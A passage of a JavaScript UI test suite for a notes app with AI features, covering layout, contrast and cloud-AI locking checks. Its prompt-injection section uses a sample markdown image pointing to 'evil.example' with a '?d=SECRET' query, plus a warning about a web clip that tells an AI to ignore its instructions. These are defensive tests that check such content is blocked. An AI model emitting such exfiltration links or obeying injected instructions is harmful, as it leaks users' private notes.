    if (can ? (lines.length !== 1 || lines[0].length < 30 || lines[0].length > 140 || !lines[0].startsWith(on[0]?.textContent.trim() || '?')) : lines.length !== 0) iss('QC 87: one plain line, for the chosen option', `${k}: ${lines.map(l => l.length)}`);
    if (opts.some(b => (b.getAttribute('aria-description') || '').length < 30)) iss('QC 87: each option says what it does (aria-description)', k);
    if (row.getBoundingClientRect().height > 130) iss('QC 87: the row is the densest in Settings', `${k}: ${Math.round(row.getBoundingClientRect().height)}px`);
    if (opts.some(b => b.disabled === can)) iss('QC 87: greyed out only without a graphics card', `${k}: disabled ${opts.map(b => b.disabled)}`);
    if (!can && !/No graphics card/.test(row.textContent)) iss('QC 87: without a card, say so', k);
    const seg = row.querySelector('.seg').getBoundingClientRect(), ob = opts.map(b => Math.round(b.getBoundingClientRect().height));
    if (Math.round(seg.height) !== 32 || ob.some(h => h !== 28)) iss('QC 87: the group is 32px and its options 28px', `${k}: ${Math.round(seg.height)} / ${ob}`);
    if (pane.scrollWidth > pane.clientWidth + 1) iss('QC 87: the page scrolls sideways', k);
    inside('.modal--settings', k); measure(k);
    if (can && sc === '1366x768') {   // a click changes the choice at once
      app.querySelector('[data-act="ais-gpu"][data-v="full"]').click();
      const now = app.querySelector('[data-ais-row="gpu"] [aria-pressed="true"]')?.dataset.v;
      if (now !== 'full') iss('QC 87: choosing Full', `${k}: ${now}`);
      app.querySelector('[data-act="ais-gpu"][data-v="off"]').click();
      if (app.querySelector('[data-ais-row="gpu"] [aria-pressed="true"]')?.dataset.v !== 'off') iss('QC 87: choosing Off', k);
    }
    if (sc === '1366x768' || sc === 'portrait1080') out.numbers.qc87[`${sc}/${state}`] = `${on[0]?.dataset.v} chosen · ${can ? 'usable' : 'greyed out'} · row ${Math.round(row.getBoundingClientRect().height)}px`;
  }
  AI.st = null; AI.demo = false; set({ screen: '1920x1080', modal: null }); renderAll();
}
/* ==== end QC 87 ==== */

/* ==== v0.1.1 · fix round A (?check=1&only=fixa, and in the full sweep): the UI/UX review's fixes stay fixed ====
   - text on an accent tint (a picked option, the launch quote, a chosen drop choice) is 4.5:1 in every theme; the "Coming soon" rows too;
   - a 160-character vault path never makes Settings scroll sideways;
   - one icon size per component (buttons, chips, status links, menu items) and one stroke (1.75; only the window glyph is 1.5);
   - no off-scale font sizes on the main screens and Settings pages (the note's own text sets its own scale);
   - no colour literals as var() fallbacks, and no z-index above 3 outside the tokens;
   - the crumb's / uses --muted; the tag box keeps a plain border on focus; "No note open"; "quick on this PC" ==== */
async function checkFixA() {
  const F = out.numbers.fixA = {};
  const keepTrail = S.trail, keepVisits = S.visits; S.trail = [...S.trail]; S.visits = [...(S.visits || [])];   // visiting views here must not lengthen the status bar's trail for the checks after it
  const parse = c => { const m = String(c).match(/[\d.]+(?:e-?\d+)?/g); if (!m) return null; let [r, g, b] = m.map(Number); if (String(c).startsWith('color(')) { r *= 255; g *= 255; b *= 255; } return { r, g, b, a: m.length > 3 ? m[3] : 1 }; };
  const over = (f, b) => ({ r: f.r * f.a + b.r * (1 - f.a), g: f.g * f.a + b.g * (1 - f.a), b: f.b * f.a + b.b * (1 - f.a), a: 1 });
  const bgOf = el => { const chain = []; for (let e = el; e; e = e.parentElement) { const c = parse(getComputedStyle(e).backgroundColor); if (c && c.a > 0) { chain.push(c); if (c.a >= .99) break; } } let base = { r: 255, g: 255, b: 255, a: 1 }; for (let i = chain.length - 1; i >= 0; i--) base = over(chain[i], base); return base; };
  const rgbStr = c => `rgb(${Math.round(c.r)},${Math.round(c.g)},${Math.round(c.b)})`;
  const ratioOf = (fg, bg) => ratio(rgbStr(fg.a < 1 ? over(fg, bg) : fg), rgbStr(bg));
  const textBits = root => { const out2 = [], w = document.createTreeWalker(root, NodeFilter.SHOW_TEXT); while (w.nextNode()) { const t = w.currentNode, el = t.parentElement; if (t.nodeValue.trim() && el && el.getClientRects().length) out2.push(el); } return [...new Set(out2)]; };
  const low = (root, k, what, min = 4.5) => textBits(root).forEach(el => { const fg = parse(getComputedStyle(el).color), bg = bgOf(el); if (!fg) return; const r = ratioOf(fg, bg); if (r < min) iss(`Fix A: ${what} under ${min}:1`, `${k}: "${el.textContent.trim().slice(0, 28)}" ${r}:1 (${el.className || el.tagName})`); });
  // 1 · text on a picked option / tint, and the Coming soon rows, in every theme (Jobs and answers, on the sample PC)
  for (const [th] of THEMES) {
    aiDemo('ready'); AIS.tab = 'jobs'; S.setSec = 'ai'; set({ screen: '1920x1080', theme: th, sample: 'typical', view: 'notes', modal: 'settings' }); out.combos++;
    const pane = app.querySelector('.modal--settings .settings-pane'); if (!pane) { iss('Fix A: no AI page', th); continue; }
    const picked = [...pane.querySelectorAll('.preset[aria-pressed="true"], .seg-opt[aria-pressed="true"], .pick[aria-pressed="true"]')];
    if (!picked.length) iss('Fix A: nothing picked to measure', th);
    picked.forEach(p => low(p, `${th}/picked`, 'text on a picked option'));
    const soon = [...pane.querySelectorAll('.route-row.is-soon')]; if (!soon.length) iss('Fix A: no Coming soon row to measure', th);
    soon.forEach(r => low(r, `${th}/soon`, 'a Coming soon row'));
    F[`tint ${th}`] = `${picked.length} picked, ${soon.length} soon`;
  }
  // 2 · a long vault path (Settings → Vault & files), at 1366 and the portrait window
  const p0 = VSTATE.path; VSTATE.path = 'C:\\Users\\someone\\OneDrive - A Long Company Name Limited\\Documents\\My notes and projects\\Work\\2026\\Quarter four planning\\NeuroVault vault folder with a very long name that keeps going';
  for (const sc of ['1366x768', 'portrait1080']) { S.setSec = 'vault'; set({ screen: sc, theme: 'slate', modal: 'settings' }); out.combos++;
    const pane = app.querySelector('.modal--settings .settings-pane'), row = pane?.querySelector('.set-desc.code.truncate');
    if (!pane || !row) { iss('Fix A: no vault path row', sc); continue; }
    if (pane.scrollWidth > pane.clientWidth + 1) iss('Fix A: a long vault path scrolls Settings sideways', `${sc}: ${pane.scrollWidth - pane.clientWidth}px`);
    if (row.getBoundingClientRect().right > pane.getBoundingClientRect().right + 1) iss('Fix A: the vault path runs out of the page', sc);
    F[`vault ${sc}`] = `path ${Math.round(row.getBoundingClientRect().width)}px in a ${pane.clientWidth}px page`; }
  VSTATE.path = p0;
  // 3 · one icon size per component and one stroke, on the main screens and Settings pages
  const sizes = {}, strokes = {}, fonts = {}, EXEMPT = '.win-btn, .logo, .nv-logo, .doc, svg svg, [data-nv-skip]';
  const FS = [11, 12, 13, 14, 15, 18, 22, 28, 40, 52];   // 52: --fs-display, the big timer digits (a named token)
  const host = svg => { const h = svg.closest('.btn, .chip, .status-link, .menu-item'); return h ? (h.matches('.btn') ? 'button' : h.matches('.chip') ? 'chip' : h.matches('.status-link') ? 'status link' : 'menu item') : null; };
  const tally = k => { app.querySelectorAll('svg').forEach(svg => { if (!svg.getClientRects().length || svg.closest(EXEMPT)) return; const h = host(svg), w = Math.round(svg.getBoundingClientRect().width);
      if (h) (sizes[h] ||= {})[w] = [...((sizes[h] || {})[w] || []), k].slice(0, 2);
      const sw = parseFloat(getComputedStyle(svg).strokeWidth); if (sw) (strokes[sw] ||= []).push(`${k} ${String(svg.closest('[class]')?.className?.baseVal ?? svg.closest('[class]')?.className ?? '').slice(0, 30)}`); });
    textBits(app).forEach(el => { if (el.closest('.doc, .logo, .ed-toolbar')) return; const fs = Math.round(parseFloat(getComputedStyle(el).fontSize) * 100) / 100; if (!FS.includes(fs)) (fonts[fs] ||= []).push(`${k} ${el.className || el.tagName}`); }); };
  for (const sc of ['1366x768', '1920x1080']) {
    for (const [view, name] of [['notes', 'Notes'], ['tasks', 'Tasks'], ['timer', 'Timer'], ['history', 'Timeline'], ['dict', 'Dictionary']]) { aiDemo('ready'); set({ screen: sc, theme: 'slate', sample: 'typical', view, modal: null }); out.combos++; tally(`${sc}/${name}`); }
    for (const [sec] of SET_SECTIONS) { if (SET_SOON[sec]) continue; for (const tab of sec === 'ai' ? ['overview', 'pc', 'cloud', 'jobs'] : [null]) { aiDemo('ready'); cloudDemoFill(AI.st); if (tab) AIS.tab = tab; S.setSec = sec; set({ screen: sc, theme: 'slate', sample: 'typical', view: 'notes', modal: 'settings' }); out.combos++; tally(`${sc}/set-${sec}${tab ? '/' + tab : ''}`); } } }
  for (const [h, ws] of Object.entries(sizes)) if (Object.keys(ws).length > 1) iss('Fix A: one icon size per component', `${h}: ${Object.entries(ws).map(([w, ks]) => `${w}px in ${ks.join(', ')}`).join(' vs ')}`);
  if (Object.keys(strokes).filter(k => ![1.75, 1.5, 2.5].includes(+k)).length) iss('Fix A: one icon stroke (1.75)', Object.entries(strokes).filter(([k]) => ![1.75, 1.5, 2.5].includes(+k)).map(([k, v]) => `${k}px in ${v[0]} (${v.length})`).join(' · '));
  for (const [fs, ks] of Object.entries(fonts)) iss('Fix A: a font size off the type scale', `${fs}px: ${ks.slice(0, 3).join(' | ')} (${ks.length})`);
  F.icons = Object.entries(sizes).map(([h, ws]) => `${h} ${Object.keys(ws).join('/')}px`).join(' · '); F.strokes = Object.keys(strokes).join(' / ');
  // 4 · the stylesheets: no colour literal as a var() fallback; no z-index above 3 outside tokens
  const lit = [], zs = [];
  for (const sheet of document.styleSheets) { let rules; try { rules = sheet.cssRules; } catch (e) { continue; }
    const walk = rs => [...rs].forEach(r => { if (r.cssRules && !r.style) return walk(r.cssRules); const t = r.cssText || ''; if (!r.style) return;
      const fb = t.match(/var\(--[\w-]+,\s*(?:#[0-9a-f]{3,8}|rgba?\()/gi); if (fb) lit.push(`${r.selectorText?.slice(0, 40)}: ${fb[0]}`);
      const z = r.style.zIndex; if (z && /^\d+$/.test(z) && +z > 3) zs.push(`${r.selectorText?.slice(0, 40)}: ${z}`); });
    walk(rules); }
  if (lit.length) iss('Fix A: a colour literal as a var() fallback', lit.slice(0, 4).join(' | ') + ` (${lit.length})`);
  if (zs.length) iss('Fix A: a z-index above 3 outside the tokens', zs.slice(0, 4).join(' | ') + ` (${zs.length})`);
  F.sheets = `${lit.length} fallbacks, ${zs.length} loose z-indexes`;
  // 5 · small ones
  set({ screen: '1366x768', theme: 'slate', sample: 'typical', view: 'notes', modal: null }); out.combos++;
  const sep = app.querySelector('.crumb-sep'); if (sep) { const r = ratioOf(parse(getComputedStyle(sep).color), bgOf(sep)); if (r < 4.5) iss('Fix A: the crumb / is under AA', r); }
  const ti = app.querySelector('.tag-input'); if (ti) { ti.focus(); if (getComputedStyle(ti).borderTopColor === colorOf('--accent')) iss('Fix A: the tag box has an accent border on focus', ''); ti.blur(); }
  aiDemo('ready'); AIS.tab = 'pc'; S.setSec = 'ai'; set({ modal: 'settings' }); const meta = [...app.querySelectorAll('.ais-lm-meta')].map(x => x.textContent).join(' ');
  if (/\bpc\b/.test(meta) || !/this PC/.test(meta)) iss('Fix A: "quick on this PC" keeps its capitals', meta.slice(0, 100));
  set({ modal: null }); AI.st = null; AI.demo = false; S.trail = keepTrail; S.visits = keepVisits; set({ screen: '1920x1080', theme: 'slate' }); renderAll();
}
/* ==== end fix round A ==== */

/* ==== R69 · prompt-injection safety (?check=1&only=r69, and in the full sweep; decided 2026-10-20). A picture from the web in an
   AI answer is not loaded ("Picture blocked" + Show; nothing from the vault is touched; a link shows its website; an insert into a note
   leaves web pictures out); an Agent card says "After reading: …" and turns amber with its reasons, Add still one click, and a plain card
   stays plain; a note from outside carries "From the web" / "Imported" in its header; the Send once / Keep on this PC / Always allow dialog
   keeps its main button last; every new text is AA in every theme. ==== */
async function checkR69() {
  const R = out.numbers.r69 = {}, bad = (k, v) => iss('R69 ' + k, v);
  const parse = c => { const m = String(c).match(/[\d.]+(?:e-?\d+)?/g); if (!m) return null; let [r, g, b] = m.map(Number); if (String(c).startsWith('color(')) { r *= 255; g *= 255; b *= 255; } return { r, g, b, a: m.length > 3 ? m[3] : 1 }; };
  const over = (f, b) => ({ r: f.r * f.a + b.r * (1 - f.a), g: f.g * f.a + b.g * (1 - f.a), b: f.b * f.a + b.b * (1 - f.a), a: 1 });
  const bgOf = el => { const chain = []; for (let e = el; e; e = e.parentElement) { const c = parse(getComputedStyle(e).backgroundColor); if (c && c.a > 0) { chain.push(c); if (c.a >= .99) break; } } let base = { r: 255, g: 255, b: 255, a: 1 }; for (let i = chain.length - 1; i >= 0; i--) base = over(chain[i], base); return base; };
  const rgbS = c => `rgb(${Math.round(c.r)},${Math.round(c.g)},${Math.round(c.b)})`;
  const low = (el, k, what) => { if (!el) { bad(what + ' missing', k); return; } const fg = parse(getComputedStyle(el).color), bg = bgOf(el), r = ratio(rgbS(fg.a < 1 ? over(fg, bg) : fg), rgbS(bg)); if (r < 4.5) bad(`${what} under 4.5:1`, `${k}: "${el.textContent.trim().slice(0, 26)}" ${r}:1`); };
  const keepR = { ...READER };
  // ---- pictures and links in an AI answer ----
  const md = '![x](https://evil.example/p?d=SECRET) and [the price](https://shop.example.com/a) and ![local](attachments/a.png) and https://auto.example/z';
  const box = document.createElement('div'); box.innerHTML = ainMd(md);
  R.pics = { webImg: box.querySelectorAll('img[src^="http"]').length, blocked: box.querySelectorAll('[data-ai-pic]').length, host: [...box.querySelectorAll('[data-ai-host]')].map(e => e.textContent.trim()) };
  if (R.pics.webImg) bad('a picture from the web still loads', R.pics.webImg);
  if (R.pics.blocked !== 1) bad('the blocked picture box', R.pics.blocked);
  if (!box.querySelector('[data-ai-pic]')?.textContent.includes('evil.example') || !box.querySelector('[data-ai-pic] [data-act="ai-pic-show"]')) bad('the blocked box shows its website and a Show button', box.querySelector('[data-ai-pic]')?.textContent);
  if (!box.querySelector('img[src^="attachments/"]')) bad('a picture from the vault was blocked too', box.innerHTML.slice(0, 160));
  if (R.pics.host.join('|') !== '· shop.example.com') bad('a link shows its website after its words (and a bare address does not repeat it)', R.pics.host.join('|'));
  AIPIC.shown.add('https://evil.example/p?d=SECRET'); box.innerHTML = ainMd(md); if (!box.querySelector('img[src^="https://evil.example"]') || box.querySelector('[data-ai-pic]')) bad('Show loads that one picture', box.innerHTML.slice(0, 120)); AIPIC.shown.clear();
  const ins = document.createElement('div'); ins.innerHTML = aiGuardHtml(NVMarkdown.mdToHtml(md), 'inert');
  if (ins.querySelector('img[src^="http"]') || ins.querySelector('[data-ai-pic]') || !ins.querySelector('img[src^="attachments/"]')) bad('an insert into a note leaves web pictures out, and keeps the vault ones', ins.innerHTML.slice(0, 160));
  // ---- the Agent card: after reading, amber, one click ----
  const sc = document.createElement('div'); app.appendChild(sc);
  const plain = { kind: 'append', n: 1, note_id: 1, note_title: 'Budget', text: 'Water the plants.', after_read: [], warn: [], amber: false };
  const flagged = { ...plain, text: 'Visit and pay £5', after_read: [{ title: 'Pricing clip', origin: 'web', hint: true }, { title: 'Memo', origin: 'imported', hint: false }], warn: ['“Pricing clip” seems to talk to an AI (it tells an AI to ignore its instructions).', 'You didn’t mention “Budget” in your request.'], amber: true };
  const A = { edit: false, agent: { max_writes: 3 } };
  sc.innerHTML = agtCard(0, A, plain);
  if (sc.querySelector('.is-amber, [data-agt-warn], [data-agt-after]')) bad('a plain card stays plain', sc.innerHTML.slice(0, 80));
  sc.innerHTML = agtCard(0, A, flagged);
  const fa = sc.querySelector('[data-agt-after]')?.textContent || '', fw = [...sc.querySelectorAll('[data-agt-warn] li')];
  R.card = { after: fa, warns: fw.length, amber: !!sc.querySelector('.agt-card.is-amber'), buttons: [...sc.querySelectorAll('.agt-cact .btn')].map(b => b.textContent.trim()) };
  if (fa !== 'After reading: Pricing clip (from the web) · Memo (imported)') bad('the card says what was read', fa);
  if (fw.length !== 2 || !R.card.amber) bad('the amber card and its reasons', JSON.stringify(R.card));
  if (R.card.buttons.join('|') !== 'Add it|Edit|Skip' || sc.querySelectorAll('[data-act="agt-add"]').length !== 1) bad('Add is still one click, beside Edit and Skip', R.card.buttons.join('|'));
  // QC 117: the one-time cloud question, as a card in the run (feedback: "what am I even being asked")
  const cloudP = { kind: 'cloud', n: null, project: 'Home Projects', company: 'Groq', outside: '', notes: ['Kitchen Plans'], key: 'project:2' };
  const cloudO = { ...cloudP, project: 'Pricing clip', outside: 'web', notes: ['Pricing clip'], key: 'outside:3' };
  for (const [k, pp] of [['project', cloudP], ['outside', cloudO]]) {
    sc.innerHTML = agtCard(0, A, pp);
    const bs = [...sc.querySelectorAll('.agt-cact .btn')], txt = sc.querySelector('.agt-cb')?.textContent || '';
    R['cloud_' + k] = { buttons: bs.map(b => b.textContent.trim()), acts: bs.map(b => b.dataset.act + ':' + b.dataset.v) };
    if (bs.map(b => b.textContent.trim()).join('|') !== 'Send once to Groq|Always allow for this project|Keep it on this PC' || bs.map(b => b.dataset.v).join('|') !== 'once|always|keep' || bs[0].className.indexOf('btn--primary') < 0 || bs.slice(1).some(b => b.className.indexOf('btn--primary') >= 0)) bad(`the cloud card's three answers (${k}): Send once main and first`, bs.map(b => b.textContent.trim()).join('|'));
    if (!/Nothing has been sent yet/.test(txt) || !/Groq, a cloud AI/.test(txt) || !txt.includes(k === 'project' ? 'Kitchen Plans' : 'came from the web')) bad(`the cloud card says in plain words what it asks (${k})`, txt.slice(0, 200));
    if (sc.querySelector('[data-act="agt-add"], [data-act="agt-skip"]')) bad('the cloud card has no Add or Skip', k);
  }
  sc.innerHTML = agtSteps({ steps: [{ k: 'read', text: 'Read “Kitchen Plans”', sub: 'not sent to Groq yet: it goes with the next step', st: 'done' }, { k: 'lock', text: 'Waiting for your answer: may Groq read notes from Home Projects?', sub: 'nothing has been sent', st: 'wait' }, { k: 'limit', text: 'Can’t open web links', sub: 'I have no web access: only your notes', st: 'skip' }] });
  if (sc.querySelectorAll('.agt-step').length !== 3 || !/not sent to Groq yet/.test(sc.textContent)) bad('the steps say "not sent yet" and the question being waited on', sc.textContent.slice(0, 160));
  sc.innerHTML = agtCard(0, { edit: true, agent: { max_writes: 3 } }, flagged);
  if (sc.querySelector('[data-agt-warn]')) bad('the edit form is not cluttered by the warning', '');
  // ---- AA in every theme ----
  for (const [th] of THEMES) {
    READER.theme = th; applyReader();
    sc.innerHTML = agtCard(0, A, cloudO) + agtSteps({ steps: [{ k: 'read', text: 'Read it', sub: 'not sent to Groq yet', st: 'done' }] }) + agtCard(0, A, flagged) + `<p><span class="ai-pic">${ic('image')}<span class="ai-pic-t">Picture blocked<span class="ai-pic-h"> · evil.example</span></span></span> <span class="ai-host">· shop.example.com</span></p>`;
    low(sc.querySelector('[data-agt-card="cloud"] .set-desc'), th, 'the cloud card’s words'); low(sc.querySelector('.agt-ss'), th, 'a step’s sub line');
    low(sc.querySelector('[data-agt-warn] li'), th, 'the warning line'); low(sc.querySelector('[data-agt-after]'), th, 'the after-reading line'); low(sc.querySelector('.ai-pic-t'), th, 'the picture-blocked text');
    low(sc.querySelector('.ai-pic-h'), th, 'the blocked picture’s website'); low(sc.querySelector('.ai-host'), th, 'the link’s website');
  }
  sc.remove(); Object.assign(READER, keepR); applyReader();
  // ---- the note's chip, and the question before a cloud model reads a note from outside ----
  set({ screen: '1366x768', view: 'notes', sample: 'typical' });
  const n = note();
  if (n) {
    for (const [o, t] of [['web', 'From the web'], ['imported', 'Imported']]) {
      LK.outside = { [n.id]: o }; renderAll();
      const ch = app.querySelector('[data-ob-chip]'); R['chip_' + o] = ch?.textContent.trim() || '';
      if (R['chip_' + o] !== t) bad('the note header chip', `${o}: ${R['chip_' + o]}`); else low(ch, o, 'the chip');
    }
    LK.outside = {}; renderAll(); if (app.querySelector('[data-ob-chip]')) bad('an ordinary note has no chip', '');
  } else bad('no note to check the chip on', '');
  let retried = false;
  LK.first = { project: 'Pricing clip', key: 'outside:3', company: 'Groq', outside: 'web', retry: () => { retried = true; }, decline: () => {} }; renderAll();
  const dg = document.querySelector('[data-dlg="lock-first"]'), btns = [...(dg?.querySelectorAll('button') || [])].map(b => b.textContent.trim()).filter(t => t && !/^Close/.test(t));
  R.dialog = btns;
  if (btns.join('|') !== 'Keep it on this PC|Always allow for this project|Send once to Groq') bad('the question: Keep it on this PC, Always allow for this project, Send once (main, last)', btns.join('|'));
  if (!dg?.textContent.includes('came from the web')) bad('the question says where the note came from', dg?.textContent.slice(0, 120));
  document.querySelector('[data-act="lk-first-once"]')?.click(); await new Promise(r => setTimeout(r, 30));
  if (LK.first || !retried) bad('Send once closes the question and asks again', `${!!LK.first} ${retried}`);
  LK.first = null; LK.outside = {}; AIPIC.shown.clear(); renderAll();
}

/* ==== R68 · keep a project, folder or note off cloud AI (?check=1&only=r68, and in the full sweep). Every scene the mockup draws, with each
   of the three scopes, in Slate and Paper at 1366 and 1920: the ⋮ menu offers Keep off cloud AI (then Allow cloud AI again); the lock badge on
   what's kept off and a quieter one on what's inside it; "Kept off cloud AI" in the note's header; Settings → AI models → Overview lists what's
   kept off with Allow cloud AI, the first-use default and Unlock for one question; Ask says so and offers Use local AI / Unlock for this question
   (and answers on this PC with its line); the model menu greys the cloud models ("kept off here"); attachments stay; Summarise on this PC says
   so; the first-use question keeps its main button last, Esc sends nothing, Keep it on this PC locks, Send sends. Every text is AA. ==== */
async function checkR68() {
  const R = out.numbers.r68 = {}, bad = (k, v) => iss('R68 ' + k, v);
  const tick = (n = 4) => new Promise(r => { let i = 0; const f = () => ++i >= n ? r() : setTimeout(f, 0); setTimeout(f, 0); });
  const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
    window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push([n, a]); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
    try { await fn(calls); } finally { window.pywebview = was; } return calls; };
  const parse = c => { const m = String(c).match(/[\d.]+(?:e-?\d+)?/g); if (!m) return null; let [r, g, b] = m.map(Number); if (String(c).startsWith('color(')) { r *= 255; g *= 255; b *= 255; } return { r, g, b, a: m.length > 3 ? m[3] : 1 }; };
  const over = (f, b) => ({ r: f.r * f.a + b.r * (1 - f.a), g: f.g * f.a + b.g * (1 - f.a), b: f.b * f.a + b.b * (1 - f.a), a: 1 });
  const bgOf = el => { const chain = []; for (let e = el; e; e = e.parentElement) { const c = parse(getComputedStyle(e).backgroundColor); if (c && c.a > 0) { chain.push(c); if (c.a >= .99) break; } } let base = { r: 255, g: 255, b: 255, a: 1 }; for (let i = chain.length - 1; i >= 0; i--) base = over(chain[i], base); return base; };
  const rgbS = c => `rgb(${Math.round(c.r)},${Math.round(c.g)},${Math.round(c.b)})`;
  const low = (root, k, what) => { if (!root) return; const w = document.createTreeWalker(root, NodeFilter.SHOW_TEXT), seen = new Set(); while (w.nextNode()) { const t = w.currentNode, el = t.parentElement; if (!t.nodeValue.trim() || !el?.getClientRects().length || seen.has(el)) continue; seen.add(el);
      const fg = parse(getComputedStyle(el).color), bg = bgOf(el), r = ratio(rgbS(fg.a < 1 ? over(fg, bg) : fg), rgbS(bg)); if (r < 4.5) bad(`${what} under 4.5:1`, `${k}: "${t.nodeValue.trim().slice(0, 26)}" ${r}:1`); } };
  const inWin = (el, k, what) => { if (!el) { bad(what + ' missing', k); return; } const a = app.getBoundingClientRect(), b = el.getBoundingClientRect(); if (b.left < a.left - 1 || b.right > a.right + 1 || b.top < a.top - 1 || b.bottom > a.bottom + 1) bad(what + ' outside the window', k); };
  const target = D.notes.find(n => n.folder === 'f-auth') || D.notes[0], other = D.notes.find(n => !ancestors(n.folder).includes('p-2')) || D.notes[1];
  const SCOPES = { project: { page: 'p-2', name: 'Engineering', ctx: 'folder' }, folder: { page: 'f-auth', name: 'Auth', ctx: 'folder' }, note: { page: target.id, name: target.title, ctx: 'note' } };
  const keep = { st: AI.st, demo: AI.demo };
  const reset = () => { LK.items = []; LK.first = null; LK.next = null; LK.ask = true; LK.once = true; S.ctx = null; S.menu = false; S.toast = null; S.modal = null;
    AIN.notes = {}; AIN.sum = { open: false, menu: null }; AIN.askUi = { open: false, menu: null }; AIN.tidy = null;
    Object.assign(AIC, { open: false, mode: 'dock', dockW: 400, rect: null, esc: 'stop', scope: 'note', chats: {}, drafts: {}, busy: null, menu: null, unread: false, caret: null, follow: 'note', hist: 'whole', histN: 6, newHow: 'fresh', aiOn: true, past: {}, viewing: null, toTop: false }); };
  const item = sc => ({ kind: lkKind(SCOPES[sc].page), id: rawId(SCOPES[sc].page), page: SCOPES[sc].page, name: SCOPES[sc].name });
  const setup = (sc, th, screen) => { reset(); aiDemo('ready'); cloudDemoFill(AI.st); Object.assign(AI.st.cloud.find(p => p.id === 'groq'), { has_key: true, seen: '2026-10-19' }); set({ screen, theme: th, sample: 'typical', view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null });
    S.noteId = target.id; S.open = new Set(['p-2', 'f-api', 'f-auth']); AI.st.routes = { ...AI.st.routes, qa: { kind: 'cloud', prov: 'groq', name: 'GPT-OSS 20B', svc: 'Groq', label: 'GPT-OSS 20B · Groq · cloud', key: 'cloud:groq', vision: false, ready: true, seen: true, has_key: true } }; AI.st.route = { ...AI.st.route, qa: 'cloud:groq' }; renderAll(); };
  const refused = what => ({ status: 'success', state: 'error', message: `${what} is kept off cloud AI, so this question wasn’t sent to Groq.`, code: 'cloud_locked', lock: { what, can_unlock: true } });
  const done = (extra = {}) => ({ status: 'success', state: 'done', kind: 'qa', result: { answer: 'It rotates the token.', by: 'Qwen3.5 4B', ...extra } });
  try {
    for (const th of ['slate', 'paper']) for (const screen of ['1366x768', '1920x1080']) for (const [sc, S0] of Object.entries(SCOPES)) {
      const k = `${th}/${screen}/${sc}`; out.combos++; setup(sc, th, screen);
      // 1 · the ⋮ menu of the project, folder or note offers it; the badge, the header chip and the note's own menu follow
      S.ctx = { kind: S0.ctx, id: S0.page, x: 130, y: 150 }; renderAll(); let b = app.querySelector('.menu--context [data-act="lk-set"]');
      if (!b || b.textContent.trim() !== 'Keep off cloud AI' || app.querySelectorAll('.menu--context [data-act="lk-set"]').length !== 1) bad('the ⋮ menu offers Keep off cloud AI', `${k}: ${b?.textContent}`); inWin(app.querySelector('.menu--context'), k, 'the ⋮ menu');
      low(app.querySelector('.menu--context'), k, 'the ⋮ menu'); b?.click(); await tick();
      if (!LK.items.some(i => i.page === S0.page) || app.querySelector('.menu--context')) bad('Keep off cloud AI locks it and closes the menu', `${k}: ${LK.items.length}`);
      const row = app.querySelector(`[data-tree][data-v="${S0.page}"]`), inner = sc === 'note' ? null : app.querySelector(`[data-tree="note"][data-v="${target.id}"] .lk-badge.is-inside`), oth = app.querySelector(`[data-tree="note"][data-v="${other.id}"] .lk-badge`);
      if (!row?.querySelector('.lk-badge:not(.is-inside)')) bad('a lock badge on what’s kept off', k);
      if (sc !== 'note' && !inner) bad('a quieter badge on what’s inside', k);
      if (oth) bad('no badge on a note that isn’t kept off', k);
      const chip = app.querySelector('[data-lk-chip]'); if (!chip || !/Kept off cloud AI/.test(chip.textContent)) bad('“Kept off cloud AI” in the note’s header', k); else { low(chip, k, 'the header chip'); const sz = Math.round(chip.querySelector('svg').getBoundingClientRect().width); if (sz !== 12) bad('the chip’s icon is 12px', `${k}: ${sz}`); }
      S.menu = true; renderAll(); const nm = app.querySelector('.menu [data-act="lk-set"]'), own = sc === 'note';
      if (!nm || (own ? nm.textContent.trim() !== 'Allow cloud AI again' : !/^Kept off by /.test(nm.textContent.trim()) || nm.getAttribute('aria-disabled') !== 'true')) bad('the note’s ⋮ menu says what keeps it off', `${k}: ${nm?.textContent}`); S.menu = false;
      S.ctx = { kind: S0.ctx, id: S0.page, x: 130, y: 150 }; renderAll(); b = app.querySelector('.menu--context [data-act="lk-set"]'); if (b?.textContent.trim() !== 'Allow cloud AI again') bad('the menu then offers Allow cloud AI again', `${k}: ${b?.textContent}`); S.ctx = null;
      // 2 · Settings → AI models → Overview
      AIS.tab = 'overview'; S.setSec = 'ai'; set({ modal: 'settings' }); const pane = app.querySelector('.modal--settings .settings-pane'), card = pane?.querySelector('[data-lk-set]');
      if (!card) bad('the Overview lists what’s kept off', k); else {
        const rows = [...card.querySelectorAll('.set-row')], names = [...card.querySelectorAll('[data-lk-row="item"] .set-label')].map(x => x.textContent.trim());
        if (names.length !== 1 || !names[0].includes(S0.name)) bad('one row for what’s kept off, with its name', `${k}: ${names}`);
        if (!card.querySelector('[data-act="lk-allow"]') || !card.querySelector('[data-act="lk-pick"]') || card.querySelectorAll('[data-act="lk-ask"][aria-pressed="true"]').length !== 1 || !card.querySelector('[data-act="lk-once-set"][aria-checked="true"]')) bad('Allow cloud AI, the picker, the first-use default and Unlock for one question', k);
        if (rows.some(r => !r.querySelector('.set-desc')?.textContent.trim())) bad('every row says what it does', k);
        if (pane.scrollWidth > pane.clientWidth + 1) bad('Settings scrolls sideways', k); low(card, k, 'the kept-off settings'); inWin(app.querySelector('.modal--settings'), k, 'Settings');
        if (th === 'slate' && screen === '1366x768' && sc === 'project') R.settings = `${rows.length} rows · ${names[0]} · ${Math.round(card.getBoundingClientRect().height)}px`;
        card.querySelector('[data-act="lk-allow"]').click(); await tick();
        if (LK.items.length || !app.querySelector('.modal--settings [data-lk-row="none"]')) bad('Allow cloud AI puts it back (Nothing is kept off yet)', k);
        const sel = app.querySelector('.modal--settings [data-act="lk-pick"]'); if (sel) { sel.value = S0.page; sel.dispatchEvent(new Event('change', { bubbles: true })); await tick(); if (sc !== 'note' && !LK.items.some(i => i.page === S0.page)) bad('picking one in Settings keeps it off', k); } }
      set({ modal: null }); LK.items = [item(sc)]; renderAll();
      // 3 · Ask in a kept-off note: say so and offer; Use local AI answers on this PC; Unlock asks once
      AIC.open = true; AIC.mode = 'dock'; S.tab = 'ask'; renderAll(); await tick();
      let last = [];
      const calls = await withApi({ ai_ask: (...a) => { last = a; return { status: 'success', job: 'a' + Math.random() }; }, ai_job: () => last[6] || last[5] ? done({ kept_off: S0.name }) : refused(S0.name) }, async calls => {
